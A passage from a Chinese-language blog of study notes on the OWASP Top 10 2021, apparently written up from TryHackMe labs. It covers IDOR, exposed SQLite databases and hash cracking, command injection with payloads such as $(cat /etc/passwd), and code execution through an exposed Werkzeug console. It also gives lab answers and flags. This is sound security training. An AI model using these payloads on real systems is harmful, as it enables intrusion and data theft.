<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>OWASP Top10-2021 | X1NRI</title>
  <meta name="author" content="X1NRI">
  
  <meta name="description" content="重启">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="OWASP Top10-2021"/>
  <meta property="og:site_name" content="X1NRI"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="X1NRI" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">X1NRI</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/links" title="Subscribe me.">
			  <i class="fa fa-chain"></i>Links
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> OWASP Top10-2021</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  
		 <div class="alert alert-success description">
			<i class="fa fa-info-circle"></i> 重启
		 </div> <!-- alert -->
	  		

	  <p><img src="/PenTest_FILE/62b245fc43da713b2baaf5cdbc83d61b_MD5.jpeg"><br><strong>开放式Web应用程序安全项目</strong>（<strong>OWASP</strong>）是一个在线社区，在<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8&action=edit&redlink=1">Web应用安全</a>领域提供免费的文章，方法，文档，工具和技术。—–摘自维基百科</p>
<h1 id="一、访问控制漏洞"><a href="#一、访问控制漏洞" class="headerlink" title="一、访问控制漏洞"></a>一、访问控制漏洞</h1><p>网站的页面受到保护，不会被普通访问者访问。例如，只有站点的管理员用户应该能够访问页面来管理其他用户。如果网站访问者可以访问他们不应该看到的受保护页面，那么访问控制就会被破坏。</p>
<p>普通访问者能够访问受保护的页面可能会导致以下情况：</p>
<ul>
<li>能够查看其他用户的敏感信息</li>
<li>访问未经授权的功能</li>
</ul>
<h2 id="IDOR"><a href="#IDOR" class="headerlink" title="IDOR"></a>IDOR</h2><p>IDOR 或不安全直接对象引用是指访问控制漏洞，您可以通过该漏洞访问通常看不到的资源。当程序员公开直接对象引用时，就会发生这种情况，该引用只是引用服务器内特定对象的标识符。就对象而言，我们可以指文件、用户、银行应用程序中的银行帐户或任何其他东西。</p>
<p>假设我们正在登录我们的银行帐户，并在正确验证自己身份后，我们会看到这样的 URL <code>https://bank.thm/account?id=111111</code> 。在该页面上，我们可以看到所有重要的银行详细信息，用户会做任何他们需要做的事情并继续前进，认为没有任何问题。<br><img src="/PenTest_FILE/97f8a530d314117566bfd1e7b060072e_MD5.jpeg"></p>
<p>然而，这里存在一个潜在的巨大问题，任何人都可以将 <code>id</code> 参数更改为 <code>222222</code> 之类的其他参数，如果站点配置不正确，那么他就会访问他人的银行信息。<br><img src="/PenTest_FILE/Pasted%20image%2020240308203059.png"></p>
<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>略</p>
<h1 id="二、加密故障"><a href="#二、加密故障" class="headerlink" title="二、加密故障"></a>二、加密故障</h1><p>加密故障是指因滥用（或缺乏使用）保护敏感信息的加密算法而产生的任何漏洞。 Web 应用程序需要加密技术来为其用户提供多个级别的机密性。</p>
<p>以安全电子邮件应用程序为例：</p>
<ul>
<li>当您使用浏览器访问电子邮件帐户时，您需要确保您与服务器之间的通信已加密。这样，任何试图捕获您的网络数据包的窃听者都将无法恢复您的电子邮件地址的内容。当我们加密客户端和服务器之间的网络流量时，我们通常将其称为加密传输中的数据。</li>
<li>由于您的电子邮件存储在由您的提供商管理的某些服务器中，因此电子邮件提供商也希望无法读取其客户的电子邮件。为此，您的电子邮件在存储在服务器上时也可能会被加密。这称为静态数据加密。</li>
</ul>
<p>加密失败的后果？</p>
<ul>
<li>加密失败通常会导致网络应用程序意外泄露敏感数据。这通常是与客户直接相关的数据（例如姓名、出生日期、财务信息），但也可能是更多技术信息，例如用户名和密码。</li>
<li>在更复杂的层面上，利用某些加密失败通常涉及诸如“中间人攻击”之类的技术，攻击者可以通过这种技术强制用户通过他们控制的设备进行连接。然后，他们将利用对任何传输数据的弱加密来访问截获的信息（如果数据一开始就被加密）。当然，许多示例要简单得多，并且可以在 Web 应用程序中找到漏洞，无需高级网络知识即可利用这些漏洞。事实上，在某些情况下，敏感数据可以直接在网络服务器本身上找到。</li>
</ul>
<h2 id="材料1"><a href="#材料1" class="headerlink" title="材料1"></a>材料1</h2><p>可从多个位置轻松访问的格式存储大量数据的最常见方法是在数据库中。这对于 Web 应用程序之类的东西来说是完美的，因为许多用户可以随时与网站交互。数据库引擎通常遵循结构化查询语言（SQL）语法。</p>
<p>在生产环境中，通常会看到数据库设置在运行 MySQL 或 MariaDB 等数据库服务的专用服务器上；但是，数据库也可以存储为文件。这些被称为“<code>flat-file</code>”数据库，因为它们作为单个文件存储在计算机上。这比设置整个数据库服务器要容易得多，并且可能会在较小的 Web 应用程序中看到。访问数据库服务器超出了今天任务的范围，因此让我们关注平面文件数据库。</p>
<p>如前所述，平面文件数据库作为文件存储在计算机磁盘上。通常，这对于网络应用程序来说不是问题，但如果数据库存储在网站的根目录下（即连接到网站的用户可以访问的文件之一），会发生什么情况？好吧，我们可以在自己的机器上下载和查询它，并且可以完全访问数据库中的所有内容。确实是敏感数据泄露！</p>
<hr>
<p>现在让我们简要介绍一下用于查询平面文件数据库的一些语法：</p>
<p>平面文件数据库最常见（也是最简单）的格式是 SQLite 数据库。这些可以在大多数编程语言中进行交互，并且有一个专用的客户端用于在命令行上查询它们。该客户端称为 <code>sqlite3</code> ，默认安装在许多 Linux 发行版上。</p>
<p>假设我们已成功下载数据库：</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">user@linux$ ls -l 
-rw-r--r-- 1 user user 8192 Feb  2 20:33 example.db

user@linux$ file example.db 
example.db: SQLite 3.x database, last written using SQLite version 3039002, file counter 1, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>要访问它，我们使用 <code>sqlite3 &lt;database-name&gt;</code>命令 ：</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">user@linux$ sqlite3 example.db                     
SQLite version 3.39.2 2022-07-21 15:24:47
Enter ".help" for usage hints.
sqlite> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们可以使用 <code>.tables</code> 命令查看数据库中的表：</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">user@linux$ sqlite3 example.db                     
SQLite version 3.39.2 2022-07-21 15:24:47
Enter ".help" for usage hints.
sqlite> .tables
customers<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此时，我们可以转储表中的所有数据，但是除非查看表信息，否则我们不一定知道每一列的含义。首先，我们使用 <code>PRAGMA table_info(customers);</code> 来查看表信息。然后我们将使用 <code>SELECT * FROM customers;</code> 从表中转储数据：</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">sqlite> PRAGMA table_info(customers);
0|cudtID|INT|1||1
1|custName|TEXT|1||0
2|creditCard|TEXT|0||0
3|password|TEXT|1||0

sqlite> SELECT * FROM customers;
0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99
1|John Walters|4671 5376 3366 8125|fef08f333cc53594c8097eba1f35726a
2|Lena Abdul|4353 4722 6349 6685|b55ab2470f160c331a99b8d8a1946b19
3|Andrew Miller|4059 8824 0198 5596|bc7b657bd56e4386e3397ca86e378f70
4|Keith Wayman|4972 1604 3381 8885|12e7a36c0710571b3d827992f4cfe679
5|Annett Scholz|5400 1617 6508 1166|e2795fc96af3f4d6288906a90a52a47f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="材料2"><a href="#材料2" class="headerlink" title="材料2"></a>材料2</h2><p>在哈希破解方面，Kali 预装了各种工具。如果您知道如何使用这些，请随意使用；然而，它们超出了本材料的范围。</p>
<p>相反，我们将使用在线工具：<a target="_blank" rel="noopener" href="https://crackstation.net/">CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.</a>，进行彩虹表碰撞</p>
<h2 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h2><p>浏览一下网络应用程序。开发人员给自己留下了一条注释，表明特定目录中有敏感数据。</p>
<ul>
<li>上述目录的名称是什么？答：<br>首页没有什么问题<br><img src="/PenTest_FILE/fa24095329b4d7b35762a42a51446691_MD5.jpeg"><br>在login看到了注释 assets<br><img src="/PenTest_FILE/a6979d552ab0aba1a1598ed86cbdaa6e_MD5.jpeg"></li>
</ul>
<p><img src="/PenTest_FILE/0ef27edd8e8b031ff089bd212b836ef8_MD5.jpeg"></p>
<p>下载webapp.db<br><img src="/PenTest_FILE/ef4b0b0e27099daa051888c28929ebf2_MD5.jpeg"><br>彩虹表打一下，密码qwertyuiop<br><img src="/PenTest_FILE/e74e0a1744696b32a4f04617ca3a825e_MD5.jpeg"></p>
<p><img src="/PenTest_FILE/f2d9cdd3125fba348d4a5f93f0b749cf_MD5.jpeg"></p>
<ul>
<li>导航到您在问题一中找到的目录。哪些文件可能包含敏感数据？：webapp.db</li>
<li>使用支持材料访问敏感数据。管理员用户的密码哈希是什么？答：6eea9b7ef19179a06954edd0f6c05ceb</li>
<li>管理员的明文密码是什么？答：qwertyuiop</li>
<li>以管理员身份登录。旗帜是什么？答：THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}</li>
</ul>
<h1 id="三、注入"><a href="#三、注入" class="headerlink" title="三、注入"></a>三、注入</h1><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>让我们考虑一个场景：MooCorp 已开始开发一个基于 Web 的应用程序，用于具有可自定义文本的奶牛 ASCII 艺术。在寻找实现应用程序的方法时，他们使用 Linux 中的 <code>cowsay</code> 命令。他们决定编写一些简单的代码，从操作系统的控制台调用owsay命令并将其内容发送回网站，而不是编写整个Web应用程序来实现艺术字的逻辑。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"mooing"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$mooing</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"mooing"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$cow</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'default'</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cow"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token variable">$cow</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cow"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        
        <span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"perl /usr/bin/cowsay -f <span class="token interpolation"><span class="token variable">$cow</span></span> <span class="token interpolation"><span class="token variable">$mooing</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/PenTest_FILE/ce81de0e88486be6a6bd78efc5bd1fe1_MD5.jpeg"></p>
<p>现在我们知道了应用程序如何在幕后工作，我们将利用称为“内联命令”的 bash 功能来滥用owsay服务器并执行我们想要的任何任意命令。</p>
<p>要执行内联命令，只需按以下格式将它们括起来 <code>$(your_command_here)</code> ：<strong>如果控制台检测到内联命令，它会先执行它，然后将结果作为外部命令的参数</strong>。请看以下示例，该示例将 <code>whoami</code> 作为 <code>echo</code> 命令内的内联命令运行：<br><img src="/PenTest_FILE/b16d18b7699611da0a4c93b6a0f2e76c_MD5.jpeg"></p>
<p>回到cowsay服务器，如果我们向web应用程序发送内联命令，将会发生如下情况：<br><img src="/PenTest_FILE/6ed0ab0e8426c7a5dd18820555a8b37f_MD5.jpeg"></p>
<h2 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h2><ul>
<li><p>网站根目录下有什么奇怪的文本文件？答：drpepper.txt</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">$(</span><span class="token function">ls</span><span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>有多少个非 root&#x2F;非服务&#x2F;非守护程序用户？答：0</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> /etc/passwd<span class="token variable">)</span></span>

 _________________________________________ 
/ root:x:0:0:root:/root:/bin/ash          <span class="token punctuation">\</span>
<span class="token operator">|</span> bin:x:1:1:bin:/bin:/sbin/nologin        <span class="token operator">|</span>
<span class="token operator">|</span> daemon:x:2:2:daemon:/sbin:/sbin/nologin <span class="token operator">|</span>
<span class="token operator">|</span> adm:x:3:4:adm:/var/adm:/sbin/nologin    <span class="token operator">|</span>
<span class="token operator">|</span> lp:x:4:7:lp:/var/spool/lpd:/sbin/nologi <span class="token operator">|</span>
<span class="token operator">|</span> n sync:x:5:0:sync:/sbin:/bin/sync       <span class="token operator">|</span>
<span class="token operator">|</span> shutdown:x:6:0:shutdown:/sbin:/sbin/shu <span class="token operator">|</span>
<span class="token operator">|</span> tdown halt:x:7:0:halt:/sbin:/sbin/halt  <span class="token operator">|</span>
<span class="token operator">|</span> mail:x:8:12:mail:/var/mail:/sbin/nologi <span class="token operator">|</span>
<span class="token operator">|</span> n                                       <span class="token operator">|</span>
<span class="token operator">|</span> news:x:9:13:news:/usr/lib/news:/sbin/no <span class="token operator">|</span>
<span class="token operator">|</span> login                                   <span class="token operator">|</span>
<span class="token operator">|</span> uucp:x:10:14:uucp:/var/spool/uucppublic <span class="token operator">|</span>
<span class="token operator">|</span> :/sbin/nologin                          <span class="token operator">|</span>
<span class="token operator">|</span> operator:x:11:0:operator:/root:/sbin/no <span class="token operator">|</span>
<span class="token operator">|</span> login                                   <span class="token operator">|</span>
<span class="token operator">|</span> man:x:13:15:man:/usr/man:/sbin/nologin  <span class="token operator">|</span>
<span class="token operator">|</span> postmaster:x:14:12:postmaster:/var/mail <span class="token operator">|</span>
<span class="token operator">|</span> :/sbin/nologin                          <span class="token operator">|</span>
<span class="token operator">|</span> cron:x:16:16:cron:/var/spool/cron:/sbin <span class="token operator">|</span>
<span class="token operator">|</span> /nologin                                <span class="token operator">|</span>
<span class="token operator">|</span> ftp:x:21:21::/var/lib/ftp:/sbin/nologin <span class="token operator">|</span>
<span class="token operator">|</span> sshd:x:22:22:sshd:/dev/null:/sbin/nolog <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token keyword">in</span>                                      <span class="token operator">|</span>
<span class="token operator">|</span> at:x:25:25:at:/var/spool/cron/atjobs:/s <span class="token operator">|</span>
<span class="token operator">|</span> bin/nologin                             <span class="token operator">|</span>
<span class="token operator">|</span> squid:x:31:31:Squid:/var/cache/squid:/s <span class="token operator">|</span>
<span class="token operator">|</span> bin/nologin xfs:x:33:33:X Font          <span class="token operator">|</span>
<span class="token operator">|</span> Server:/etc/X11/fs:/sbin/nologin        <span class="token operator">|</span>
<span class="token operator">|</span> games:x:35:35:games:/usr/games:/sbin/no <span class="token operator">|</span>
<span class="token operator">|</span> login                                   <span class="token operator">|</span>
<span class="token operator">|</span> cyrus:x:85:12::/usr/cyrus:/sbin/nologin <span class="token operator">|</span>
<span class="token operator">|</span> vpopmail:x:89:89::/var/vpopmail:/sbin/n <span class="token operator">|</span>
<span class="token operator">|</span> ologin                                  <span class="token operator">|</span>
<span class="token operator">|</span> ntp:x:123:123:NTP:/var/empty:/sbin/nolo <span class="token operator">|</span>
<span class="token operator">|</span> gin                                     <span class="token operator">|</span>
<span class="token operator">|</span> smmsp:x:209:209:smmsp:/var/spool/mqueue <span class="token operator">|</span>
<span class="token operator">|</span> :/sbin/nologin                          <span class="token operator">|</span>
<span class="token operator">|</span> guest:x:405:100:guest:/dev/null:/sbin/n <span class="token operator">|</span>
<span class="token operator">|</span> ologin                                  <span class="token operator">|</span>
<span class="token operator">|</span> nobody:x:65534:65534:nobody:/:/sbin/nol <span class="token operator">|</span>
<span class="token operator">|</span> ogin                                    <span class="token operator">|</span>
<span class="token operator">|</span> apache:x:100:101:apache:/var/www:/sbin/ <span class="token operator">|</span>
<span class="token punctuation">\</span> nologin                                 /
 -----------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>该应用程序以什么用户身份运行？答：apache</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">$(</span><span class="token function">whoami</span><span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>用户的shell设置为什么？答：&#x2F;sbin&#x2F;nologin</p>
</li>
<li><p>正在运行什么版本的 Alpine Linux？答：3.16.0<br>百度一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> /etc/alpine-release<span class="token variable">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ul>
<h1 id="四、不安全的设计"><a href="#四、不安全的设计" class="headerlink" title="四、不安全的设计"></a>四、不安全的设计</h1><h2 id="不安全的密码设置"><a href="#不安全的密码设置" class="headerlink" title="不安全的密码设置"></a>不安全的密码设置</h2><p>不久前 Instagram 上就出现了此类漏洞的一个很好的例子。 Instagram 允许用户通过短信向他们的手机号码发送 6 位代码进行验证，从而重置忘记的密码。如果攻击者想要访问受害者的帐户，他可以尝试暴力破解 6 位代码。正如预期的那样，这不可能直接实现，因为 Instagram 实施了速率限制，在 250 次尝试后用户将被阻止进一步尝试。</p>
<p>然而，我们发现速率限制仅适用于来自同一 IP 的代码尝试。如果攻击者有多个不同的 IP 地址来发送请求，他现在可以为每个 IP 尝试 250 个代码。对于 6 位代码，有一百万个可能的代码，因此攻击者需要 1000000&#x2F;250 &#x3D; 4000 个 IP 才能覆盖所有可能的代码。这听起来似乎需要拥有大量的 IP，但云服务可以轻松地以相对较小的成本获取这些 IP，从而使这种攻击变得可行。</p>
<p>请注意该漏洞与以下想法的关系：<strong>没有用户能够使用数千个 IP 地址发出并发请求来尝试暴力破解数字代码</strong>。问题在于设计而不是应用程序本身的实现。</p>
<h2 id="练习-3"><a href="#练习-3" class="headerlink" title="练习"></a>练习</h2><p>进入界面，我们已知存在一个叫 joseph 的账户<br><img src="/PenTest_FILE/49c0c6266ac071671a8c653949afba31_MD5.jpeg"></p>
<p>重置密码试试：<br><img src="/PenTest_FILE/039fafd2b913859361d2e398676c06c3_MD5.jpeg"></p>
<p>最喜欢的颜色？感觉可以爆破一手<br><img src="/PenTest_FILE/e53a3d749562d760f4943959f538c23e_MD5.jpeg"><br>看来你喜欢green哈</p>
<p>也是成功重置了密码<br><img src="/PenTest_FILE/6470021c2fe4321810e8947bdb610359_MD5.jpeg"><br><img src="/PenTest_FILE/bdc9bc8a9329d78002d75e0bafff0541_MD5.jpeg"></p>
<h1 id="五、安全配置错误"><a href="#五、安全配置错误" class="headerlink" title="五、安全配置错误"></a>五、安全配置错误</h1><p>安全配置错误与其他十大漏洞不同，因为它们发生在本可以适当配置安全但没有进行配置的情况下</p>
<p>安全错误配置包括：</p>
<ul>
<li>云服务（例如 S3 存储桶）的权限配置不当。</li>
<li>启用不必要的功能，例如服务、页面、帐户或权限。</li>
<li>密码未更改的默认帐户。</li>
<li>错误消息过于详细，允许攻击者找到有关系统的更多信息。</li>
<li>不使用 HTTP 安全标头。</li>
</ul>
<h2 id="调试接口"><a href="#调试接口" class="headerlink" title="调试接口"></a>调试接口</h2><p>常见的安全错误配置涉及生产软件中调试功能的暴露。编程框架中通常提供调试功能，允许开发人员访问高级功能，这对于在开发过程中调试应用程序很有用。<strong>如果开发人员在发布应用程序之前忘记禁用其中一些调试功能，则攻击者可能会滥用其中一些调试功能。</strong></p>
<p>据称，2015 年 Patreon 遭到黑客攻击时就利用了此类漏洞。在 Patreon 遭到黑客攻击的五天前，一名安全研究人员向 Patreon 报告说，他发现了 Werkzeug 控制台的开放调试接口。 Werkzeug 是基于 Python 的 Web 应用程序中的重要组件，因为它为 Web 服务器提供执行 Python 代码的接口。 Werkzeug 包含一个调试控制台，可以通过 <code>/console</code> 上的 URL 访问该控制台，或者如果应用程序引发异常，该控制台也会呈现给用户。在这两种情况下，控制台都会提供一个 Python 控制台，它将运行您发送给它的任何代码。对于攻击者来说，这意味着他可以任意执行命令。</p>
<h2 id="练习-4"><a href="#练习-4" class="headerlink" title="练习"></a>练习</h2><p>导航至 <a target="_blank" rel="noopener" href="http://10.10.226.188:86/console">http://10.10.226.188:86/console</a> 以访问 Werkzeug 控制台。</p>
<p>看样子是个python调试台<br><img src="/PenTest_FILE/1deb4efdfea453b8c26ad802ae9d1e05_MD5.jpeg"></p>
<ul>
<li>当前目录中的数据库文件名（扩展名为 .db 的文件）是什么？答：todo.db<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> os<span class="token punctuation">;</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls -al'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token string">'total 40\ndrwxr-xr-x    1 root     root          4096 Feb  3  2023 .\ndrwxr-xr-x    1 root     root          4096 Sep 15  2022 ..\n-rw-r--r--    1 root     root           249 Sep 15  2022 Dockerfile\n-rw-r--r--    1 root     root          1411 Feb  3  2023 app.py\n-rw-r--r--    1 root     root           137 Sep 15  2022 requirements.txt\ndrwxr-xr-x    2 root     root          4096 Sep 15  2022 templates\n-rw-r--r--    1 root     root          8192 Sep 15  2022 todo.db\n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
<li>修改代码以读取 app.py 文件的内容，该文件包含应用程序的源代码。源代码中 secret_flag 变量的值是多少？答：THM{Just_a_tiny_misconfiguration}<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> os<span class="token punctuation">;</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat app.py'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token string">'import os\nfrom flask import Flask, render_template, request, redirect, url_for\nfrom flask_sqlalchemy import SQLAlchemy\n\nsecret_flag = "THM&#123;Just_a_tiny_misconfiguration&#125;"\n\nPROJECT_ROOT = os.path.dirname(os.path.realpath(__file__))\nDATABASE = os.path.join(PROJECT_ROOT, \'todo.db\')\n\napp = Flask(__name__)\napp.config[\'SQLALCHEMY_DATABASE_URI\'] = "sqlite:////" + DATABASE\ndb = SQLAlchemy(app)\n\n\nclass Todo(db.Model):\n    id = db.Column(db.Integer, primary_key=True)\n    title = db.Column(db.String(80))\n    complete = db.Column(db.Boolean)\n\n\n@app.route("/")\ndef index():\n    todo_list = Todo.query.all()\n    return render_template("index.html", todo_list=todo_list)\n\n\n@app.route("/add", methods=["POST"])\ndef add():\n    title = request.form.get("title")\n    new_todo = Todo(title=title, complete=False)\n    db.session.add(new_todo)\n    db.session.commit()\n    return redirect(url_for("index"))\n\n\n@app.route("/complete/&lt;string:todo_id>")\ndef complete(todo_id):\n    todo = Todo.query.filter_by(id=todo_id).first()\n    todo.complete = not todo.complete\n    db.session.commit()\n    return redirect(url_for("index"))\n\n\n@app.route("/delete/&lt;string:todo_id>")\ndef delete(todo_id):\n    todo = Todo.query.filter_by(id=todo_id).first()\n    db.session.delete(todo)\n    db.session.commit()\n    return redirect(url_for("index"))\n\n\nif __name__ == "__main__":\n    db.create_all()\n    app.run(host=\'0.0.0.0\', port=5000, debug=True)\n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
</ul>
<h1 id="六、易受攻击或过时的组件"><a href="#六、易受攻击或过时的组件" class="headerlink" title="六、易受攻击或过时的组件"></a>六、易受攻击或过时的组件</h1><p>有时，您可能会发现您正在测试的公司&#x2F;实体正在使用具有众所周知漏洞的程序。</p>
<p>例如，假设一家公司已经几年没有更新其 WordPress 版本，并且使用 WPScan 等工具，您会发现它的版本是 4.6。一些快速研究表明 WordPress 4.6 容易受到未经身份验证的远程代码执行 (RCE) 漏洞的攻击，更好的是，您可以在 Exploit-DB 上找到已经存在的漏洞。</p>
<p>正如您所看到的，这将是相当具有破坏性的，因为攻击者只需要很少的工作。由于该漏洞已经众所周知，因此其他人可能已经利用了该漏洞。当您意识到这种情况很容易发生时，情况会变得更糟。如果一家公司错过了其使用的程序的一次更新，那么它可能容易受到任意数量的攻击。</p>
<p>所以，我们的主要工作是找出该软件的信息并进行研究，直到找到漏洞利用程序。让我们通过一个示例 Web 应用程序来完成这个过程。<br><img src="/PenTest_FILE/49eba25342587552308607ebdf8019b9_MD5.jpeg"><br>你知道什么？该服务器具有 Nostromo Web 服务器的默认页面。现在我们有了版本号和软件名称，我们可以使用 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/">Exploit-DB</a> 网站来尝试找到该特定版本的漏洞。<br><img src="/PenTest_FILE/8c90b8666d5d47d89a0597986278c5b5_MD5.jpeg"><br>幸运的是，最重要的结果恰好是一个漏洞利用脚本。让我们下载它并尝试执行代码。</p>
<p>您从互联网下载的漏洞第一次可能不起作用。你需要理解脚本所使用的编程语言，以便在需要时，您可以修复任何错误或进行任何修改，因为 Exploit-DB 上的很多脚本都不可能原封不动直接能够使用</p>
<h2 id="练习-5"><a href="#练习-5" class="headerlink" title="练习"></a>练习</h2><p>欢迎来到CSE网上书店，本网站是使用 PHP 和 MYSQL（程序函数）制作的！ 布局使用 Bootstrap 使其响应更快。 这只是一个简单的网站！<br><img src="/PenTest_FILE/f5b3b915203616be75a553351b977eca_MD5.jpeg"></p>
<p>我一开始的思路是这样：</p>
<blockquote>
<p>Bootstrap是一组用于网站和网络应用程序开发的开源前端框架，包括HTML、CSS及JavaScript的框架，提供字体排印、窗体、按钮、导航及其他各种组件及Javascript扩展，旨在使动态网页和Web应用的开发更加容易。</p>
</blockquote>
<blockquote>
